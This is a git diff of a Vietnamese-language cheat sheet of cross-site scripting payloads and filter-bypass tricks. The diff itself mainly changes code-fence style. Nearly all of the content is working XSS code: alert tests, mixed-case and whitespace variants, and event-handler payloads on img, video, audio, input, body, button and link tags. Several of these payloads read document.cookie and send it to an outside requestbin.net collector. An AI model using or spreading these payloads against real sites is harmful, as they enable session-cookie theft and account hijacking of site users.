@@ -21,48 +21,66 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 ## Các load js nguyên thủy (Không mask) huyền thoại 
 ### Alert message
 
-~~~js
+```js
 <script>alert(1);</script>
-~~~
+```
 
 ### Dùng window location
 
-~~~js
+```js
 <script>window.location="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie)</script>
-~~~
+```
 
 ### Dùng image
 
-~~~js
+```js
 <script>new Image().src="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie);</script>
-~~~
+```
 
 ## Các payload sử dụng mask
 ### Case sensitive
 
-~~~js
+```js
 <SCRIPT>alert(1);</SCRIPT>
 <ScRipT>alert(1);</sCriPt>
-~~~
+```
 ### Lọc thẻ script
 * Insert thêm ký tự trình duyệt hay bỏ qua (Tab, escape)
 
-~~~js
+```js
 <script  >alert(1);</script   >
-~~~
+```
 
 * Không dùng thẻ script
 
-~~~js
+```js
 <img src=x onerror=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>
+```
+```js
 <video src=1 onerror=alert(1)>
+```
+```js
 <audio src=1 onerror=alert(1)>
+```
+```js
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
+```
+```js
 <audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+```
+```js
 <video src=1 href=1 onerror="javascript:alert(1)"></video>
+```
+```js
 <input onblur=javascript:alert(1) autofocus><input autofocus>
+```
+```js
 <BODY ONLOAD=alert('XSS')>
+```
+```js
 <button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>
+```
+```js
 <a onmouseover=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>xxs link</a>
-~~~
+```
 
